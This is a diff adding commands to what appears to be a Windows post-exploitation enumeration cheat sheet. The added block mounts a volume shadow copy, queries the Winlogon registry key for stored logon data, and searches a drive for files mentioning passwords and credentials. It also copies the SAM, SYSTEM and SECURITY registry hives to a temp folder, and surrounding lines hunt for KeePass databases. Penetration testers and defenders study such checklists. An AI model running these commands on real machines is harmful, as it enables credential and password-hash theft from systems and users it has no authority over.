@@ -10,6 +10,26 @@ route print
 netstat -ano
 
 
+#check anyway
+vssadmin list shadows
+mklink /d C:\shadow \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+dir C:\shadow\Windows\Panther
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+wmic logicaldisk get name,description,filesystem
+mountvol
+fsutil fsinfo drives
+dir D:\
+findstr /si password D:\*
+findstr /si pass D:\*
+findstr /si credential D:\*
+dir D:\ /s /b | findstr /i ".xml .ini .bak .config .txt"
+copy D:\Windows\System32\Config\SAM C:\Temp\SAM
+copy D:\Windows\System32\Config\SYSTEM C:\Temp\SYSTEM
+copy D:\Windows\System32\Config\SECURITY C:\Temp\SECURITY
+dir D:\Windows\Panther
+dir D:\Windows\System32\config
+net use
+
 #Hidden in plainview
 
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
